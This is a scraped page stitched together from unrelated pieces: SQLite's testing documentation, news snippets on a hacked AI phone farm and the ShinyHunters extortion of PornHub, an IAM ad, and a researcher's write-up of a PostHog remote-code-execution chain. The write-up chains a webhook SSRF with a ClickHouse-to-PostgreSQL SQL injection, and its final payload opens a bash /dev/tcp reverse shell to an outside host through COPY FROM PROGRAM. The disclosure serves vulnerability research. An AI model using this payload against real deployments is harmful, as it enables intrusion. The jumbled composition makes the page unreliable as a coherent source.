    &lt;p&gt;Unfortunately, SQLite contains many branch instructions that help the code run faster without changing the output. Such branches generate false-positives during mutation testing. As an example, consider the following hash function used to accelerate table-name lookup:&lt;/p&gt;
    &lt;quote&gt;55 static unsigned int strHash(const char *z){ 56 unsigned int h = 0; 57 unsigned char c; 58 while( (c = (unsigned char)*z++)!=0 ){ /*OPTIMIZATION-IF-TRUE*/ 59 h = (h&amp;lt;&amp;lt;3) ^ h ^ sqlite3UpperToLower[c]; 60 } 61 return h; 62 }&lt;/quote&gt;
    &lt;p&gt;If the branch instruction that implements the "c!=0" test on line 58 is changed into a no-op, then the while-loop will loop forever and the test suite will fail with a time-out. But if that branch is changed into an unconditional jump, then the hash function will always return 0. The problem is that 0 is a valid hash. A hash function that always returns 0 still works in the sense that SQLite still always gets the correct answer. The table-name hash table degenerates into a linked-list and so the table-name lookups that occur while parsing SQL statements might be a little slower, but the end result will be the same.&lt;/p&gt;
    &lt;p&gt; To work around this problem, comments of the form "&lt;code&gt;/*OPTIMIZATION-IF-TRUE*/&lt;/code&gt;" and
"&lt;code&gt;/*OPTIMIZATION-IF-FALSE*/&lt;/code&gt;" are inserted into the SQLite
source code to tell the mutation testing script to ignore some branch
instructions.



&lt;/p&gt;
    &lt;p&gt;The developers of SQLite have found that full coverage testing is an extremely effective method for locating and preventing bugs. Because every single branch instruction in SQLite core code is covered by test cases, the developers can be confident that changes made in one part of the code do not have unintended consequences in other parts of the code. The many new features and performance improvements that have been added to SQLite in recent years would not have been possible without the availability of full-coverage testing.&lt;/p&gt;
    &lt;p&gt;Maintaining 100% MC/DC is laborious and time-consuming. The level of effort needed to maintain full-coverage testing is probably not cost effective for a typical application. However, we think that full-coverage testing is justified for a very widely deployed infrastructure library like SQLite, and especially for a database library which by its very nature "remembers" past mistakes.&lt;/p&gt;
    &lt;p&gt;Dynamic analysis refers to internal and external checks on the SQLite code which are performed while the code is live and running. Dynamic analysis has proven to be a great help in maintaining the quality of SQLite.&lt;/p&gt;
    &lt;p&gt;The SQLite core contains 6754 assert() statements that verify function preconditions and postconditions and loop invariants. Assert() is a macro which is a standard part of ANSI-C. The argument is a boolean value that is assumed to always be true. If the assertion is false, the program prints an error message and halts.&lt;/p&gt;
    &lt;p&gt;Assert() macros are disabled by compiling with the NDEBUG macro defined. In most systems, asserts are enabled by default. But in SQLite, the asserts are so numerous and are in such performance critical places, that the database engine runs about three times slower when asserts are enabled. Hence, the default (production) build of SQLite disables asserts. Assert statements are only enabled when SQLite is compiled with the SQLITE_DEBUG preprocessor macro defined.&lt;/p&gt;
    &lt;p&gt;See the Use Of assert in SQLite document for additional information about how SQLite uses assert().&lt;/p&gt;
    &lt;p&gt;Valgrind is perhaps the most amazing and useful developer tool in the world. Valgrind is a simulator - it simulates an x86 running a Linux binary. (Ports of Valgrind for platforms other than Linux are in development, but as of this writing, Valgrind only works reliably on Linux, which in the opinion of the SQLite developers means that Linux should be the preferred platform for all software development.) As Valgrind runs a Linux binary, it looks for all kinds of interesting errors such as array overruns, reading from uninitialized memory, stack overflows, memory leaks, and so forth. Valgrind finds problems that can easily slip through all of the other tests run against SQLite. And, when Valgrind does find an error, it can dump the developer directly into a symbolic debugger at the exact point where the error occurs, to facilitate a quick fix.&lt;/p&gt;
    &lt;p&gt;Because it is a simulator, running a binary in Valgrind is slower than running it on native hardware. (To a first approximation, an application running in Valgrind on a workstation will perform about the same as it would running natively on a smartphone.) So it is impractical to run the full SQLite test suite through Valgrind. However, the veryquick tests and the coverage of the TH3 tests are run through Valgrind prior to every release.&lt;/p&gt;
    &lt;p&gt;SQLite contains a pluggable memory allocation subsystem. The default implementation uses system malloc() and free(). However, if SQLite is compiled with SQLITE_MEMDEBUG, an alternative memory allocation wrapper (memsys2) is inserted that looks for memory allocation errors at run-time. The memsys2 wrapper checks for memory leaks, of course, but also looks for buffer overruns, uses of uninitialized memory, and attempts to use memory after it has been freed. These same checks are also done by valgrind (and, indeed, Valgrind does them better) but memsys2 has the advantage of being much faster than Valgrind, which means the checks can be done more often and for longer tests.&lt;/p&gt;
    &lt;p&gt;SQLite contains a pluggable mutex subsystem. Depending on compile-time options, the default mutex system contains interfaces sqlite3_mutex_held() and sqlite3_mutex_notheld() that detect whether or not a particular mutex is held by the calling thread. These two interfaces are used extensively within assert() statements in SQLite to verify mutexes are held and released at all the right moments, in order to double-check that SQLite does work correctly in multi-threaded applications.&lt;/p&gt;
    &lt;p&gt;One of the things that SQLite does to ensure that transactions are atomic across system crashes and power failures is to write all changes into the rollback journal file prior to changing the database. The TCL test harness contains an alternative OS backend implementation that helps to verify this is occurring correctly. The "journal-test VFS" monitors all disk I/O traffic between the database file and rollback journal, checking to make sure that nothing is written into the database file which has not first been written and synced to the rollback journal. If any discrepancies are found, an assertion fault is raised.&lt;/p&gt;
    &lt;p&gt;The journal tests are an additional double-check over and above the crash tests to make sure that SQLite transactions will be atomic across system crashes and power failures.&lt;/p&gt;
    &lt;p&gt;In the C programming language, it is very easy to write code that has "undefined" or "implementation defined" behavior. That means that the code might work during development, but then give a different answer on a different system, or when recompiled using different compiler options. Examples of undefined and implementation-defined behavior in ANSI C include:&lt;/p&gt;
    &lt;p&gt;Since undefined and implementation-defined behavior is non-portable and can easily lead to incorrect answers, SQLite works very hard to avoid it. For example, when adding two integer column values together as part of an SQL statement, SQLite does not simply add them together using the C-language "+" operator. Instead, it first checks to make sure the addition will not overflow, and if it will, it does the addition using floating point instead.&lt;/p&gt;
    &lt;p&gt;To help ensure that SQLite does not make use of undefined or implementation defined behavior, the test suites are rerun using instrumented builds that try to detect undefined behavior. For example, test suites are run using the "-ftrapv" option of GCC. And they are run again using the "-fsanitize=undefined" option on Clang. And again using the "/RTC1" option in MSVC. Then the test suites are rerun using options like "-funsigned-char" and "-fsigned-char" to make sure that implementation differences do not matter either. Tests are then repeated on 32-bit and 64-bit systems and on big-endian and little-endian systems, using a variety of CPU architectures. Furthermore, the test suites are augmented with many test cases that are deliberately designed to provoke undefined behavior. For example: "SELECT -1*(-9223372036854775808);".&lt;/p&gt;
    &lt;p&gt;The sqlite3_test_control(SQLITE_TESTCTRL_OPTIMIZATIONS, ...) interface allows selected SQL statement optimizations to be disabled at run-time. SQLite should always generate exactly the same answer with optimizations enabled and with optimizations disabled; the answer simply arrives quicker with the optimizations turned on. So in a production environment, one always leaves the optimizations turned on (the default setting).&lt;/p&gt;
    &lt;p&gt;One verification technique used on SQLite is to run an entire test suite twice, once with optimizations left on and a second time with optimizations turned off, and verify that the same output is obtained both times. This shows that the optimizations do not introduce errors.&lt;/p&gt;
    &lt;p&gt;Not all test cases can be handled this way. Some test cases check to verify that the optimizations really are reducing the amount of computation by counting the number of disk accesses, sort operations, full-scan steps, or other processing steps that occur during queries. Those test cases will appear to fail when optimizations are disabled. But the majority of test cases simply check that the correct answer was obtained, and all of those cases can be run successfully with and without the optimizations, in order to show that the optimizations do not cause malfunctions.&lt;/p&gt;
    &lt;p&gt;The SQLite developers use an on-line checklist to coordinate testing activity and to verify that all tests pass prior to each SQLite release. Past checklists are retained for historical reference. (The checklists are read-only for anonymous internet viewers, but developers can log in and update checklist items in their web browsers.) The use of checklists for SQLite testing and other development activities is inspired by The Checklist Manifesto .&lt;/p&gt;
    &lt;p&gt;The latest checklists contain approximately 200 items that are individually verified for each release. Some checklist items only take a few seconds to verify and mark off. Others involve test suites that run for many hours.&lt;/p&gt;
    &lt;p&gt;The release checklist is not automated: developers run each item on the checklist manually. We find that it is important to keep a human in the loop. Sometimes problems are found while running a checklist item even though the test itself passed. It is important to have a human reviewing the test output at the highest level, and constantly asking "Is this really right?"&lt;/p&gt;
    &lt;p&gt;The release checklist is continuously evolving. As new problems or potential problems are discovered, new checklist items are added to make sure those problems do not appear in subsequent releases. The release checklist has proven to be an invaluable tool in helping to ensure that nothing is overlooked during the release process.&lt;/p&gt;
    &lt;p&gt;Static analysis means analyzing source code at compile-time to check for correctness. Static analysis includes compiler warning messages and more in-depth analysis engines such as the Clang Static Analyzer. SQLite compiles without warnings on GCC and Clang using the -Wall and -Wextra flags on Linux and Mac and on MSVC on Windows. No valid warnings are generated by the Clang Static Analyzer tool "scan-build" either (though recent versions of clang seem to generate many false-positives.) Nevertheless, some warnings might be generated by other static analyzers. Users are encouraged not to stress over these warnings and to instead take solace in the intense testing of SQLite described above.&lt;/p&gt;
    &lt;p&gt;Static analysis has not been helpful in finding bugs in SQLite. Static analysis has found a few bugs in SQLite, but those are the exceptions. More bugs have been introduced into SQLite while trying to get it to compile without warnings than have been found by static analysis.&lt;/p&gt;
    &lt;p&gt;SQLite is open source. This gives many people the idea that it is not well tested as commercial software and is perhaps unreliable. But that impression is false. SQLite has exhibited very high reliability in the field and a very low defect rate, especially considering how rapidly it is evolving. The quality of SQLite is achieved in part by careful code design and implementation. But extensive testing also plays a vital role in maintaining and improving the quality of SQLite. This document has summarized the testing procedures that every release of SQLite undergoes with the hope of inspiring confidence that SQLite is suitable for use in mission-critical applications.&lt;/p&gt;

  &lt;main&gt;&lt;p&gt;Doublespeed, a startup backed by Andreessen Horowitz (a16z) that uses a phone farm to manage at least hundreds of AI-generated social media accounts and promote products has been hacked. The hack reveals what products the AI-generated accounts are promoting, often without the required disclosure that these are advertisements, and allowed the hacker to take control of more than 1,000 smartphones that power the company.&lt;/p&gt;&lt;p&gt;The hacker, who asked for anonymity because he feared retaliation from the company, said he reported the vulnerability to Doublespeed on October 31. At the time of writing, the hacker said he still has access to the company’s backend, including the phone farm itself. Doublespeed did not respond to a request for comment.&lt;/p&gt;&lt;head rend="h2"&gt;This post is for paid members only&lt;/head&gt;&lt;p&gt;Become a paid member for unlimited ad-free access to articles, bonus podcast content, and more.&lt;/p&gt; Subscribe &lt;head rend="h2"&gt;Sign up for free access to this post&lt;/head&gt;&lt;p&gt;Free members get access to posts like this one along with an email round-up of our week's stories.&lt;/p&gt; Subscribe &lt;p&gt;Already have an account?

    &lt;p&gt;Adult video platform PornHub is being extorted by the ShinyHunters extortion gang after the search and watch history of its Premium members was reportedly stolen in a recent Mixpanel data breach.&lt;/p&gt;
    &lt;p&gt;Last week, PornHub disclosed that it was impacted by a recent breach at analytics vendor Mixpanel. Mixpanel suffered a breach on November 8th, 2025, after an SMS phishing (smishing) attack enabled threat actors to compromise its systems.&lt;/p&gt;
    &lt;p&gt;"A recent cybersecurity incident involving Mixpanel, a third-party data analytics provider, has impacted some Pornhub Premium users," reads a PornHub security notice posted on Friday.&lt;/p&gt;
    &lt;p&gt;"Specifically, this situation affects only select Premium users. It is important to note this was not a breach of Pornhub Premium's systems. Passwords, payment details, and financial information remain secure and were not exposed."&lt;/p&gt;
    &lt;p&gt;PornHub says it has not worked with Mixpanel since 2021, indicating the stolen records are historical analytics data from 2021 or earlier.&lt;/p&gt;
    &lt;p&gt;Mixpanel says the breach affected a "limited number" of customers, with OpenAI and CoinTracker previously disclosing they were affected.&lt;/p&gt;
    &lt;p&gt;This is the first time it has been publicly confirmed that ShinyHunters was behind the Mixpanel breach.&lt;/p&gt;
    &lt;p&gt;When contacting PornHub, the company did not provide additional comment to BleepingComputer beyond the security notice.&lt;/p&gt;
    &lt;p&gt;After publishing our story, Mixpanel told BleepingComputer that it does not believe this data originated from the recent November breach.&lt;/p&gt;
    &lt;p&gt;"Mixpanel is aware of reports that Pornhub has been extorted with data that that was allegedly stolen from us," Mixpanel told BleepingComputer.&lt;/p&gt;
    &lt;p&gt;"We can find no indication that this data was stolen from Mixpanel during our November 2025 security Incident or otherwise."&lt;/p&gt;
    &lt;p&gt;"The data was last accessed by a legitimate employee account at Pornhub’s parent company in 2023. If this data is in the hands of an unauthorized party, we do not believe that is the result of a security incident at Mixpanel."&lt;/p&gt;
    &lt;head rend="h2"&gt;PornHub search and watch history exposed&lt;/head&gt;
    &lt;p&gt;Today, BleepingComputer learned that ShinyHunters began extorting Mixpanel customers last week, sending emails that began with "We are ShinyHunters" and warned that their stolen data would be published if a ransom was not paid.&lt;/p&gt;
    &lt;p&gt;In an extortion demand sent to PornHub, ShinyHunters claims it stole 94GB of data containing over 200 million records of personal information in the Mixpanel breach.&lt;/p&gt;
    &lt;p&gt;ShinyHunters later confirmed to BleepingComputer that they were behind the extortion emails, claiming the data consists of 201,211,943 records of historical search, watch, and download activity for the platform's Premium members.&lt;/p&gt;
    &lt;p&gt;A small sample of data shared with BleepingComputer shows that the analytic events sent to Mixpanel contain a large amount of sensitive information that a member would not likely want publicly disclosed.&lt;/p&gt;
    &lt;p&gt;This data includes a PornHub Premium member's email address, activity type, location, video URL, video name, keywords associated with the video, and the time the event occurred.&lt;/p&gt;
    &lt;p&gt;Activity types seen by BleepingComputer include whether the PornHub subscriber watched or downloaded a video or viewed a channel. However, ShinyHunters also said the events include search histories.&lt;/p&gt;
    &lt;p&gt;The ShinyHunters extortion group has been behind a string of data breaches this year by compromising various Salesforce integration companies to gain access to Salesforce instances and steal company data.&lt;/p&gt;
    &lt;p&gt;The threat group is linked to the exploitation of the Oracle E-Business Suite zero-day (CVE-2025-61884), as well as to Salesforce/Drift attacks that impacted a large number of organizations earlier this year.&lt;/p&gt;
    &lt;p&gt;More recently ShinyHunters conducted a breach at GainSight that allowed the threat actors to steal further Salesforce data from organizations.&lt;/p&gt;
    &lt;p&gt;With it now confirmed that ShinyHunters is also behind the Mixpanel breach, the threat actors are responsible for some of the most significant data breaches in 2025, impacting hundreds of companies.&lt;/p&gt;
    &lt;p&gt;ShinyHunters is also creating a new ransomware-as-a-service called ShinySpid3r, which will serve as a platform for them and threat actors associated with Scattered Spider to conduct ransomware attacks.&lt;/p&gt;

    &lt;p&gt;Broken IAM isn't just an IT problem - the impact ripples across your whole business.&lt;/p&gt;
    &lt;p&gt;This practical guide covers why traditional IAM practices fail to keep up with modern demands, examples of what "good" IAM looks like, and a simple checklist for building a scalable strategy.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;It was yet another day at the office. Our team was internally discussing moving to a different platform analytics solution. Our team was really leaning more towards Posthog. It’s one of the brilliant -I personally believe it’s the best- products on the market. And that’s where the story has begun…&lt;/p&gt;
    &lt;p&gt;We have a somewhat unconventional—some might say non-scalable—approach to vendor selection. Before we seriously consider adopting a product, we give ourselves a strict 24-hour “research window.” Not a marketing review. Not a feature comparison spreadsheet. A hands-on, source-level, deep dive into how the product actually behaves once it’s running in our environment.&lt;/p&gt;
    &lt;p&gt;Earlier this year, the process was no different.&lt;/p&gt;
    &lt;p&gt;PostHog came up as a strong candidate. It was open source, widely adopted, and promised exactly what we were looking for: self-hosted product analytics with a modern architecture and a fast time-to-value. Spinning it up was trivial. With a single command and a few containers, we had a fully functional instance running locally within minutes.&lt;/p&gt;
    &lt;head rend="h2"&gt;Act 1 – Installation and Understanding the High-Level Architecture&lt;/head&gt;
    &lt;p&gt;Installation was relatively trivial. I just followed the https://posthog.com/docs/self-host documentation and did some tweaks. Understanding the architecture at a high level was always a good starting point for developing attack scenarios later. I mean, literally a few weeks later, your brain will remember these tiny bits of information when you stumble upon a problem and desperately try to find a solution! Therefore, please always spend more time on Act-1 on your own research projects.&lt;/p&gt;
    &lt;p&gt;The following diagram shows an over-simplified version of the PostHog architecture. But it’s enough to understand what’s going on behind the scenes&lt;/p&gt;
    &lt;p&gt;Before ending this section, I would like to add this. There are workers and plug-in services written with the Rust language, which are not shown in the above diagram. Imagine that this “Celery” box is actually divided into different workers and plug-ins. This will be important later.&lt;/p&gt;
    &lt;head rend="h2"&gt;Act 2 – Multiple Server-Side Request Forgery&lt;/head&gt;
    &lt;p&gt;PostHog officially supports thousands of external integrations, allowing teams to pull data from CRMs, support platforms, billing systems, and internal tools. The promise is compelling:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Analyze product and customer data in PostHog – no matter where it was generated.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;From a product perspective, this makes perfect sense. From a security perspective, it is all about SSRF. Therefore I immidiately started to looking for SSRF vulnerabilities by reading source code for main application, as well as workers and plug-ins and I ended-up finding following SSRF vulnerabilities.&lt;/p&gt;
    &lt;p&gt;CVE-2024-9710 | PostHog Rust Webhook Handler Server-Side Request Forgery Information Disclosure Vulnerability&lt;/p&gt;
    &lt;p&gt;CVE-2025-1522 | PostHog database_schema Server-Side Request Forgery Information Disclosure Vulnerability&lt;/p&gt;
    &lt;p&gt;CVE-2025-1521 | PostHog slack_incoming_webhook Server-Side Request Forgery Information Disclosure Vulnerability&lt;/p&gt;
    &lt;p&gt;I will just focus on only one case in this write-up. At the end of the day it won’t matter which SSRF is gonna be used for the RCE chain.&lt;/p&gt;
    &lt;head rend="h2"&gt;“Bypass” of &lt;code&gt;CVE-2023-46746&lt;/code&gt; | Analysis of PostHog Rust Webhook Handler Server-Side Request Forgery&lt;/head&gt;
    &lt;p&gt;You can configure Posthog to send HTTP POST requests to the URL based on the defined actions.More information about webhook can be found at https://posthog.com/docs/webhooks :&lt;/p&gt;
    &lt;p&gt;The following screenshot shows how to add a webhook endpoint to the project. When you try to add localhost, it is going to be rejected.&lt;/p&gt;
    &lt;p&gt;The Following request is being send to the &lt;code&gt;test_slack_webhook&lt;/code&gt; endpoint. As you can see in the response, localhost is not allowed to be added as a webhook endpoint.&lt;/p&gt;
    &lt;code&gt;POST /api/user/test_slack_webhook/ HTTP/2
Host: us.posthog.com
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
  "webhook": "http://localhost/"
}&lt;/code&gt;
    &lt;p&gt;I received &lt;code&gt;{"error":"invalid webhook URL"}&lt;/code&gt; which is an error I was expecting. A quick search on the code base has shown where the validation takes place.&lt;/p&gt;

    &lt;p&gt;The SSRF validation on this code flow is actually pretty good and solid. But this endpoint just performs validation on the URL. The question is:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Which endpoint actually saves the URL ?&lt;/item&gt;
      &lt;item&gt;When/where is this endpoint used during a webhook call?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;(BONUS: If you go ahead and read the raise_if_user_provided_url_unsafe function, you will see that validation can be bypassed with simple TOCTOU approach. Give it a try on your local if you havent heard TOCTOU vulnerabilities &amp;lt;3)&lt;/p&gt;
    &lt;p&gt;To answer these questions, I started with a valid domain name.&lt;/p&gt;
    &lt;p&gt;When the frontend receives a &lt;code&gt;success: true&lt;/code&gt; response from the &lt;code&gt;test_slack_webhook&lt;/code&gt; endpoint, it assumes the URL is safe and proceeds to save the configuration. However, while the test endpoint applied SSRF validations, the save endpoint did not enforce the same checks.&lt;/p&gt;
    &lt;p&gt;By bypassing the frontend and sending a direct &lt;code&gt;PATCH&lt;/code&gt; request to the project API, it was possible to store a webhook URL pointing to &lt;code&gt;localhost&lt;/code&gt; or other internal addresses. This created a persistent SSRF primitive, as the webhook worker would later issue server-side requests to these internal destinations. &lt;/p&gt;
    &lt;head rend="h2"&gt;Triggering the Action: Rust Webhook Worker&lt;/head&gt;
    &lt;p&gt;To trigger the webhook delivery, I created a new action under Data Management → Actions → New Action, selecting “From event or pageview.” Using a simple regex that matches all events ensured the action would fire for virtually any browser activity.&lt;/p&gt;
    &lt;p&gt;Once the action was saved, no further setup was required. Any incoming event matching the regex would automatically trigger the Rust-based webhook worker, which then issued a server-side request to the webhook URL configured earlier.&lt;/p&gt;
    &lt;p&gt;Now you can either use your own browser to send event data or, you can use &lt;code&gt;posthog-python&lt;/code&gt; SDK. Following simple requests will send an event to PostHog, which will trigger all the steps I’ve mentioned above.&lt;/p&gt;
    &lt;p&gt;We all know it’s quite important to know what type of SSRF we have in terms of exploitation capabilities. At this point, I dived into how to trigger the SSRF and better understand our lovely SSRF primitive.&lt;/p&gt;
    &lt;head rend="h2"&gt;Rust Webhook Worker – Understading our SSRF Primitive&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;send_webhook&lt;/code&gt; method from &lt;code&gt;rust/hook-worker/src/worker.rs&lt;/code&gt; is the one who is sending these outgoing HTTP webhook requests.When a Rust worker processes the job, it sends a request to the configured webhook URL without re-validating the destination. As a result, any previously saved internal URL is trusted and used directly, introducing an SSRF condition.&lt;/p&gt;
    &lt;code&gt;async fn send_webhook(
    client: reqwest::Client,
    method: &amp;amp;HttpMethod,
    url: &amp;amp;str,
    headers: &amp;amp;collections::HashMap&amp;lt;String, String&amp;gt;,
    body: String,
) -&amp;gt; Result&amp;lt;reqwest::Response, WebhookError&amp;gt; {
    let method: http::Method = method.into();
    let url: reqwest::Url = (url).parse().map_err(WebhookParseError::ParseUrlError)?;
    let headers: reqwest::header::HeaderMap = (headers)
        .try_into()
        .map_err(WebhookParseError::ParseHeadersError)?;
    let body = reqwest::Body::from(body);

    let response = client
        .request(method, url)
        .headers(headers)
        .body(body)
        .send()
        .await
        .map_err(|e| {
            if is_error_source::&amp;lt;NoPublicIPv4Error&amp;gt;(&amp;amp;e) {
                WebhookRequestError::NonRetryableRetryableRequestError {
                    error: e,
                    status: None,
                    response: None,
                }
            } else {
                WebhookRequestError::RetryableRequestError {
                    error: e,
                    status: None,
                    response: None,
                    retry_after: None,
                }
            }
        })?;&lt;/code&gt;
    &lt;p&gt;Additionally, the worker follows HTTP redirects. This allows an incoming &lt;code&gt;POST&lt;/code&gt; request to be redirected into a &lt;code&gt;GET&lt;/code&gt; request targeting an internal HTTP service by responding with a &lt;code&gt;302&lt;/code&gt; redirect to the desired internal endpoint. This is the most important information I needed to know. Later down the road, you will see that we actually need an HTTP GET request for our RCE chain.&lt;/p&gt;
    &lt;head rend="h2"&gt;Act 3 – Clickhouse SQL injection in postgresql and sqlite table functions 0-day&lt;/head&gt;
    &lt;p&gt;PostHog is explicit about its architecture: “ClickHouse is our main analytics backend”. Every event, every action, and every query ultimately flows through ClickHouse.&lt;/p&gt;
    &lt;p&gt;Once a reliable SSRF primitive existed, this made ClickHouse the most natural internal service to target. By default, ClickHouse exposes an &lt;code&gt;HTTP API&lt;/code&gt; on &lt;code&gt;TCP port 8123&lt;/code&gt;. This interface is enabled out of the box and, in common self-hosted deployments, does not require authentication or API tokens. The API allows queries to be issued directly over HTTP.&lt;/p&gt;
    &lt;p&gt;By design, HTTP &lt;code&gt;GET&lt;/code&gt; requests to the query endpoint are treated as read-only. Any operation that modifies data is expected to be performed via an HTTP &lt;code&gt;POST&lt;/code&gt; request with a specific request body. This distinction initially suggests a strong safety boundary.&lt;/p&gt;
    &lt;head rend="h2"&gt;Clickhouse Table Functions&lt;/head&gt;
    &lt;p&gt;One of the interesting features of the Clickhouse is called Table Functions, which can be used in the &lt;code&gt;FROM&lt;/code&gt; clause of a &lt;code&gt;SELECT&lt;/code&gt; statement. These functions create temporary, query-scoped tables that exist only for the duration of the query.&lt;/p&gt;
    &lt;p&gt;One such function is &lt;code&gt;postgresql()&lt;/code&gt;, which allows ClickHouse to read from—or write to—a remote PostgreSQL database. Let’s say we have the following table in PostgreSQL:&lt;/p&gt;
    &lt;code&gt;postgres=# CREATE TABLE "public"."test" (
"int_id" SERIAL,
"int_nullable" INT NULL DEFAULT NULL,
"float" FLOAT NOT NULL,
"str" VARCHAR(100) NOT NULL DEFAULT '',
"float_nullable" FLOAT NULL DEFAULT NULL,
PRIMARY KEY (int_id));

CREATE TABLE

postgres=# INSERT INTO test (int_id, str, "float") VALUES (1,'test',2);
INSERT 0 1

postgresql&amp;gt; SELECT * FROM test;
  int_id | int_nullable | float | str  | float_nullable
 --------+--------------+-------+------+----------------
       1 |              |     2 | test |
(1 row)&lt;/code&gt;
    &lt;p&gt;We can reach this postgresql server and fetch the data from the test table by using Clickhouse Table function as follows:&lt;/p&gt;
    &lt;code&gt;http://clickhouse:8123/?query=SELECT * FROM ('db:5432','posthog', 'posthog_table','posthog','posthog')&lt;/code&gt;
    &lt;p&gt;When I was reading the documentation, conceptually, the flow looks safe:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;ClickHouse parses the query (above one taken from user via HTTP API)&lt;/item&gt;
      &lt;item&gt;It validates the inputs&lt;/item&gt;
      &lt;item&gt;It generates its own internal PostgreSQL query&lt;/item&gt;
      &lt;item&gt;That query is executed remotely, typically via a &lt;code&gt;COPY (SELECT …) TO STDOUT&lt;/code&gt;statement&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But at the same time, more questions are raised on my mind. How do they actually make sure that transaction is READ only ? Because that’s what they say in their documentation. All the GET requests to the Clickhouse API can do operation with a READ ONLY mode. Second question was more important:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;How does the user-controlled input provided in a ClickHouse query end up escaping sanitization and being injected when ClickHouse internally builds the PostgreSQL query executed on the remote PostgreSQL database?&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Here is the internally built PostgreSQL query to be executed on the remote db.&lt;/p&gt;
    &lt;code&gt;COPY (SELECT attname AS name, format_type(atttypid, atttypmod) AS type, attnotnull AS not_null, attndims AS dims, atttypid as type_id, atttypmod as type_modifier, attgenerated as generated FROM pg_attribute WHERE attrelid = (SELECT oid FROM pg_class WHERE relname = 'posthog_table' AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public')) AND NOT attisdropped AND attnum &amp;gt; 0 ORDER BY attnum ASC) TO STDOUT&lt;/code&gt;
    &lt;head rend="h2"&gt;Wrong PostgreSQL escaping leading to Remote PostgreSQL Injection Vulnerability&lt;/head&gt;
    &lt;p&gt;Escaping is tricky stuff. Especially the PostgreSQL universe; it can even get more complicated.&lt;/p&gt;
    &lt;p&gt;When I’ve seen the table name that I’ve provided is used on the final PostgreSQL query, I started to thinking about, “What if they made a mistake on the escaping here and I can actually inject my own query into the final Postgresql query???”&lt;/p&gt;
    &lt;code&gt;http://clickhouse:8123/?query=SELECT * FROM ('db:5432','posthog', 'posthog_table\'','posthog','posthog')&lt;/code&gt;
    &lt;p&gt;I have added one single quote to the end of the username. Hit the ENTER and looked for the Postgresql console to see incoming query. And BOOM! They actually try to escape single quote with a back-slash, which is just a string for Postgresql universe.&lt;/p&gt;
    &lt;code&gt;COPY (SELECT attname AS name, format_type(atttypid, atttypmod) AS type, attnotnull AS not_null, attndims AS dims, atttypid as type_id, atttypmod as type_modifier, attgenerated as generated FROM pg_attribute WHERE attrelid = (SELECT oid FROM pg_class WHERE relname = 'posthog_user\'' AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public')) AND NOT attisdropped AND attnum &amp;gt; 0 ORDER BY attnum ASC) TO STDOU&lt;/code&gt;
    &lt;p&gt;That small bug on the Clickhouse actually doesn’t expose a seriouse vulnerability for Clickhouse itself. But in this context, it can actually help us to achieve a RCE.&lt;/p&gt;
    &lt;head rend="h2"&gt;Escalating SQL Injection to the Remote Code Execution&lt;/head&gt;
    &lt;p&gt;As it described on Clickhouse documentation, their API is designed to be READ ONLY on any operation for HTTP GET As described in the Clickhouse documentation, their API is designed to be READ ONLY on any operation for HTTP GET requests. But we can literally inject our own query into the postgresql table function, which allows us to execute any query on the database we want! But we must do a few more tricks to actually execute any query we want.&lt;/p&gt;
    &lt;p&gt;This time let’s have a look at my final payload first and then break it down. Sending the following query is enough to have a reverse shell from the PostgreSQL instance.&lt;/p&gt;
    &lt;code&gt;http://clickhouse:8123/?query=SELECT+*+FROM+postgresql('db:5432','posthog',\"posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\\"bash+-i+&amp;gt;%26+/dev/tcp/172.31.221.180/4444+0&amp;gt;%261\\\"$$;SELECT+*+FROM+cmd_exec;+--\",'posthog','posthog')#&lt;/code&gt;
    &lt;p&gt;Here is the how does it work:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;We first escape from the COPY operation by using &lt;code&gt;posthog_use'&lt;/code&gt;and close it with&lt;code&gt;')&lt;/code&gt;&lt;code&gt;)+TO+STDOUT&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;We reached out to the Clickhouse HTTP API with GET request, thus our COPY operation actually have READ ONLY transaction on PostgreSQL, thus we need to call &lt;code&gt;;END;&lt;/code&gt;Otherwise we can NOT execute our own query 🙂&lt;/item&gt;
      &lt;item&gt;And then by using PostgreSQL’s FROM PROGRAM feature, we can easily run any operating system command we want.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The most important trick here is actually usage of &lt;code&gt;$$&lt;/code&gt; instead of &lt;code&gt;single quotes&lt;/code&gt; within the payload section. These dollar signs (&lt;code&gt;$$&lt;/code&gt;) are used for dollar quoting. It can be used to replace single quotes enclosing string literals (constants) anywhere in SQL scripts. If I have used &lt;code&gt;single quotes&lt;/code&gt; again for our own query, it would have been “escaped” by Clickhouse by using black-slash, which will cause a syntax error on the PostgreSQL side!&lt;/p&gt;
    &lt;head rend="h2"&gt;Act 4 – Chaining them all together&lt;/head&gt;
    &lt;p&gt;Each issue on its own appeared low to moderate impact. But once you chained them together, we have the following attack chain:&lt;/p&gt;
    &lt;p&gt;1 – Forgotten webhook URL validation on save method.&lt;lb/&gt;2 – No SSRF protection on internal worker written with Rust.&lt;lb/&gt;3 – Exploiting SSRF to convert the POST request to a GET request&lt;lb/&gt;4 – Clickhouse postgresql escaping mistake leads to SQL Injection.&lt;lb/&gt;5 – Breaking out of COPY transaction and executing our own COPY FROM PROGRAM payload.&lt;lb/&gt;6 – Forming a special payload that satisfies both Clickhouse and Postgresql by using dollar quoting.&lt;lb/&gt;7 – Clickhouse internal docker name and Postgresql credentials are static.&lt;/p&gt;
    &lt;p&gt;Here is the diagram version of the attack chain.&lt;/p&gt;
    &lt;p&gt;And the exploit in action.&lt;/p&gt;

  &lt;main&gt;
